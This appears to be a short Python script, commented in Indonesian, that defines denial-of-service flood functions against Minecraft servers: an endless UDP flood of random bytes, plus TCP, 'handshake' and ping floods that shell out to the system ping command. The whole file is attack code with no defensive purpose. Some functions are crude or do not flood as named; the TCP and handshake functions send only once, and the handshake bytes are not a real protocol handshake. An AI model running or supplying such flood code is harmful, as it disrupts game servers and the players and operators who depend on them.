import socket
import random

# TCP Flood untuk Minecraft
def minecraft_tcp_flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))
    client.send(b'GET / HTTP/1.1\r\n')
    print(f"Sent TCP flood to {target_ip}:{target_port}")

# UDP Flood untuk Minecraft
def minecraft_udp_flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = random._urandom(1024)
    while True:
        client.sendto(message, (target_ip, target_port))
        print(f"Sent UDP packet to {target_ip}:{target_port}")

# Minecraft Handshake Flood
def minecraft_handshake_flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))
    handshake_payload = b'\x00\x00\x00\x00'
    client.send(handshake_payload)
    print(f"Sent Minecraft handshake flood to {target_ip}:{target_port}")

# ICMP Flood
def minecraft_ping_flood(target_ip):
    import os
    os.system(f"ping {target_ip} -c 1000")
    print(f"Ping flood sent to {target_ip}")
